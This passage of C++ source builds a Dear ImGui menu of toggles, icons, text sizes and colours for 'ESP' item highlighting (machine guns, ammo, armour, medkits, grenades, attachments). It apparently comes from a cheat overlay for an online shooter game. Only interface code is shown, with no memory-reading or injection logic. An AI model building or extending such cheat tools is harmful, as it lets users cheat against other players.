													ImGui::ColorEdit4("x2", (float*)&Setting::Esp_Item_x2_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("x3", &Setting::Esp_Item_x3);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##x3_Icon", &Setting::Esp_Item_x3_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S3X, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_x3_TextSize", &Setting::Esp_Item_x3_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("x3", (float*)&Setting::Esp_Item_x3_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("x4", &Setting::Esp_Item_x4);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##x4_Icon", &Setting::Esp_Item_x4_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S4X, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_x4_TextSize", &Setting::Esp_Item_x4_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("x4", (float*)&Setting::Esp_Item_x4_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("x6", &Setting::Esp_Item_x6);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##x6_Icon", &Setting::Esp_Item_x6_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S6X, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_x6_TextSize", &Setting::Esp_Item_x6_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("x6", (float*)&Setting::Esp_Item_x6_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("x8", &Setting::Esp_Item_x8);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##x8_Icon", &Setting::Esp_Item_x8_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S8X, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_x8_TextSize", &Setting::Esp_Item_x8_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("x8", (float*)&Setting::Esp_Item_x8_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);


													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Lmg"))
											{
												if (ImGui::BeginTable("ITEM_LMG", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("M249", &Setting::Esp_Item_M249);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##M249_Icon", &Setting::Esp_Item_M249_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M249, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_M249_TextSize", &Setting::Esp_Item_M249_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M249", (float*)&Setting::Esp_Item_M249_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("MG3", &Setting::Esp_Item_MG3);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##MG3_Icon", &Setting::Esp_Item_MG3_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::MG3, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_MG3_TextSize", &Setting::Esp_Item_MG3_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("MG3", (float*)&Setting::Esp_Item_MG3_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);



													ImGui::TableNextColumn();
													ImGui::Checkbox("DP28", &Setting::Esp_Item_DP28);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##DP28_Icon", &Setting::Esp_Item_DP28_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::DP28, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_DP28_TextSize", &Setting::Esp_Item_DP28_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("DP28", (float*)&Setting::Esp_Item_DP28_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Ammo"))
											{
												if (ImGui::BeginTable("ITEM_AMMO", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("7.62mm", &Setting::Esp_Item_762mm);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##7.62mm_Icon", &Setting::Esp_Item_762mm_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Amm7, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_762mm_TextSize", &Setting::Esp_Item_762mm_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("762mm", (float*)&Setting::Esp_Item_762mm_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("556mm", &Setting::Esp_Item_556mm);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_556mm_Icon", &Setting::Esp_Item_556mm_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Amm5, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_556mm_TextSize", &Setting::Esp_Item_556mm_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("556mm", (float*)&Setting::Esp_Item_556mm_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("9mm", &Setting::Esp_Item_9mm);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_9mm_Icon", &Setting::Esp_Item_9mm_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Amm9, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_9mm_TextSize", &Setting::Esp_Item_9mm_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("9mm", (float*)&Setting::Esp_Item_9mm_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("45ACP", &Setting::Esp_Item_45ACP);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_45ACP_Icon", &Setting::Esp_Item_45ACP_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Amm45, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_45ACP_TextSize", &Setting::Esp_Item_45ACP_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("45ACP", (float*)&Setting::Esp_Item_45ACP_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("12Guage", &Setting::Esp_Item_12Guage);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_12Guage_Icon", &Setting::Esp_Item_12Guage_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Amm12, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_12Guage_TextSize", &Setting::Esp_Item_12Guage_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("12Guage", (float*)&Setting::Esp_Item_12Guage_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Bags"))
											{
												if (ImGui::BeginTable("ITEM_BAGS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Bag1", &Setting::Esp_Item_Bag1);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Bag1_Icon", &Setting::Esp_Item_Bag1_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::BagV1, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Bag1_TextSize", &Setting::Esp_Item_Bag1_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Bag1", (float*)&Setting::Esp_Item_Bag1_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Bag2", &Setting::Esp_Item_Bag2);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Bag2_Icon", &Setting::Esp_Item_Bag2_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::BagV2, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Bag2_TextSize", &Setting::Esp_Item_Bag2_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Bag2", (float*)&Setting::Esp_Item_Bag2_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Bag3", &Setting::Esp_Item_Bag3);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Bag3_Icon", &Setting::Esp_Item_Bag3_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::BagV3, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Bag3_TextSize", &Setting::Esp_Item_Bag3_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Bag3", (float*)&Setting::Esp_Item_Bag3_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Armors"))
											{
												if (ImGui::BeginTable("ITEM_ARMORS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Armor1", &Setting::Esp_Item_Armor1);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Armor1_Icon", &Setting::Esp_Item_Armor1_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::VestV1, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Armor1_TextSize", &Setting::Esp_Item_Armor1_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Armor1", (float*)&Setting::Esp_Item_Armor1_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Armor2", &Setting::Esp_Item_Armor2);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Armor2_Icon", &Setting::Esp_Item_Armor2_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::VestV2, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Armor2_TextSize", &Setting::Esp_Item_Armor2_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Armor2", (float*)&Setting::Esp_Item_Armor2_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Armor3", &Setting::Esp_Item_Armor3);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Armor3_Icon", &Setting::Esp_Item_Armor3_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::VestV3, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Armor3_TextSize", &Setting::Esp_Item_Armor3_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Armor3", (float*)&Setting::Esp_Item_Armor3_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Helmets"))
											{
												if (ImGui::BeginTable("ITEM_HELMETS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Helmet1", &Setting::Esp_Item_Helmet1);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Helmet1_Icon", &Setting::Esp_Item_Helmet1_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::HelmetV2, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Helmet1_TextSize", &Setting::Esp_Item_Helmet1_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Helmet1", (float*)&Setting::Esp_Item_Helmet1_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Helmet2", &Setting::Esp_Item_Helmet2);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Helmet2_Icon", &Setting::Esp_Item_Helmet2_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::HelmetV1, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Helmet2_TextSize", &Setting::Esp_Item_Helmet2_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Helmet2", (float*)&Setting::Esp_Item_Helmet2_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Helmet3", &Setting::Esp_Item_Helmet3);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Helmet3_Icon", &Setting::Esp_Item_Helmet3_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::HelmetV3, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Helmet3_TextSize", &Setting::Esp_Item_Helmet3_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Helmet3", (float*)&Setting::Esp_Item_Helmet3_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Health"))
											{
												if (ImGui::BeginTable("ITEM_HEALTH", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Bandage", &Setting::Esp_Item_Bandage);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Bandage_Icon", &Setting::Esp_Item_Bandage_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Bandage, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Bandage_TextSize", &Setting::Esp_Item_Bandage_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Bandage", (float*)&Setting::Esp_Item_Bandage_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("MedKit", &Setting::Esp_Item_MedKit);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_MedKit_Icon", &Setting::Esp_Item_MedKit_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::MedKit, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_MedKit_TextSize", &Setting::Esp_Item_MedKit_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("MedKit", (float*)&Setting::Esp_Item_MedKit_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("FirstAidKit", &Setting::Esp_Item_FirstAidKit);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_FirstAidKit_Icon", &Setting::Esp_Item_FirstAidKit_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::FirstAid, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_FirstAidKit_TextSize", &Setting::Esp_Item_FirstAidKit_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("FirstAidKit", (float*)&Setting::Esp_Item_FirstAidKit_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Painkiller", &Setting::Esp_Item_Painkiller);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Painkiller_Icon", &Setting::Esp_Item_Painkiller_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Pinkiller, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Painkiller_TextSize", &Setting::Esp_Item_Painkiller_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Painkiller", (float*)&Setting::Esp_Item_Painkiller_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("EnergyDrink", &Setting::Esp_Item_EnergyDrink);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_EnergyDrink_Icon", &Setting::Esp_Item_EnergyDrink_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::DrinkEnergy, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_EnergyDrink_TextSize", &Setting::Esp_Item_EnergyDrink_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("EnergyDrink", (float*)&Setting::Esp_Item_EnergyDrink_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("AdrenalineSyringe", &Setting::Esp_Item_AdrenalineSyringe);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_AdrenalineSyringe_Icon", &Setting::Esp_Item_AdrenalineSyringe_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Injection, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AdrenalineSyringe_TextSize", &Setting::Esp_Item_AdrenalineSyringe_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("AdrenalineSyringe", (float*)&Setting::Esp_Item_AdrenalineSyringe_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Grenades"))
											{
												if (ImGui::BeginTable("ITEM_GRENADES", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Granade", &Setting::Esp_Item_Frag);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Frag_Icon", &Setting::Esp_Item_Frag_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::FragGrenade, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Frag_TextSize", &Setting::Esp_Item_Frag_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Frag", (float*)&Setting::Esp_Item_Frag_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Smoke", &Setting::Esp_Item_Smoke);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Smoke_Icon", &Setting::Esp_Item_Smoke_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SmokeGrenade, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Smoke_TextSize", &Setting::Esp_Item_Smoke_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Smoke", (float*)&Setting::Esp_Item_Smoke_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Molotof", &Setting::Esp_Item_Molotof);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Molotof_Icon", &Setting::Esp_Item_Molotof_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::BurnGrenade, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Molotof_TextSize", &Setting::Esp_Item_Molotof_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Molotof", (float*)&Setting::Esp_Item_Molotof_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Attachments"))
											{
												if (ImGui::BeginTable("ITEM_ATTACHMENTS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Vertical", &Setting::Esp_Item_Vertical);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Vertical_Icon", &Setting::Esp_Item_Vertical_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Vertical, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Vertical_TextSize", &Setting::Esp_Item_Vertical_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Vertical", (float*)&Setting::Esp_Item_Vertical_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("HalfGrip", &Setting::Esp_Item_HalfGrip);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_HalfGrip_Icon", &Setting::Esp_Item_HalfGrip_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::HalfGrip, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_HalfGrip_TextSize", &Setting::Esp_Item_HalfGrip_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("HalfGrip", (float*)&Setting::Esp_Item_HalfGrip_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Angled", &Setting::Esp_Item_Angled);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Angled_Icon", &Setting::Esp_Item_Angled_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Angled, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Angled_TextSize", &Setting::Esp_Item_Angled_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Angled", (float*)&Setting::Esp_Item_Angled_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Lasersight", &Setting::Esp_Item_Lasersight);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Lasersight_Icon", &Setting::Esp_Item_Lasersight_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Lasersight, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Lasersight_TextSize", &Setting::Esp_Item_Lasersight_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Lasersight", (float*)&Setting::Esp_Item_Lasersight_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("ThumbGrip", &Setting::Esp_Item_ThumbGrip);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_ThumbGrip_Icon", &Setting::Esp_Item_ThumbGrip_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ThumbGrip, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_ThumbGrip_TextSize", &Setting::Esp_Item_ThumbGrip_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("ThumbGrip", (float*)&Setting::Esp_Item_ThumbGrip_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("FlashHider", &Setting::Esp_Item_Large_FlashHider);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Large_FlashHider_Icon", &Setting::Esp_Item_Large_FlashHider_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARFlashHider, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Large_FlashHider_TextSize", &Setting::Esp_Item_Large_FlashHider_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("ThumbGrip", (float*)&Setting::Esp_Item_Large_FlashHider_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Compensator", &Setting::Esp_Item_Large_Compensator);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Large_Compensator_Icon", &Setting::Esp_Item_Large_Compensator_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARCompensator, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Large_Compensator_TextSize", &Setting::Esp_Item_Large_Compensator_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Compensator", (float*)&Setting::Esp_Item_Large_Compensator_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Suppressor", &Setting::Esp_Item_Large_Suppressor);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Large_Suppressor_Icon", &Setting::Esp_Item_Large_Suppressor_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARSuppressor, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Large_Suppressor_TextSize", &Setting::Esp_Item_Large_Suppressor_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Large_Suppressor", (float*)&Setting::Esp_Item_Large_Suppressor_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Chekpad", &Setting::Esp_Item_Taktik);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Taktik_Icon", &Setting::Esp_Item_Taktik_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARCheckPad, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Taktik_TextSize", &Setting::Esp_Item_Taktik_TextSize, 1, 50);
